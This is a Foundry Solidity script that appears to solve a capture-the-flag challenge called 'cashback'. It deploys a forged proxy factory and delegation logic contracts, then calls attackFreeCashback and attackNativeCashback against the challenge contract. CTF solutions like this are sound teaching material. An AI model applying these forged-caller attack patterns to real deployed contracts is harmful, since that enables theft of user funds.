// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Cashback, Currency} from "../../src/challenge-36-cashback/Cashback.sol";
import {FreeDelegationLogic} from "../../src/challenge-36-cashback/FreeDelegationLogic.sol";
import {NativeDelegationLogic} from "../../src/challenge-36-cashback/NativeDelegationLogic.sol";
import {ForgedProxyFactory} from "../../src/challenge-36-cashback/ForgedProxyFactory.sol";

interface ICashbackFactory {
    function FREE() external view returns (address);
}

contract AttackCashbackScript is Script {
    address constant NATIVE_CURRENCY = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function run() external {
        address cashback = vm.envAddress("CASHBACK");
        address level = vm.envAddress("LEVEL_ADDRESS");
        address player = vm.envAddress("PLAYER");

        address free = ICashbackFactory(level).FREE();
        address superCashbackNFT = Cashback(payable(cashback)).superCashbackNFT();

        vm.startBroadcast();

        ForgedProxyFactory factory = new ForgedProxyFactory();

        FreeDelegationLogic freeLogic = new FreeDelegationLogic(cashback, free, player, superCashbackNFT);

        address forgedFreeCaller = factory.deploy(cashback, address(freeLogic));
        FreeDelegationLogic(forgedFreeCaller).attackFreeCashback();

        NativeDelegationLogic nativeLogic = new NativeDelegationLogic(cashback, player, superCashbackNFT);

        address forgedNativeCaller = factory.deploy(cashback, address(nativeLogic));
        NativeDelegationLogic(forgedNativeCaller).attackNativeCashback();

        vm.stopBroadcast();

        console.log("FREE:", free);
        console.log("Forged FREE caller:", forgedFreeCaller);
        console.log("Forged native caller:", forgedNativeCaller);
    }
}
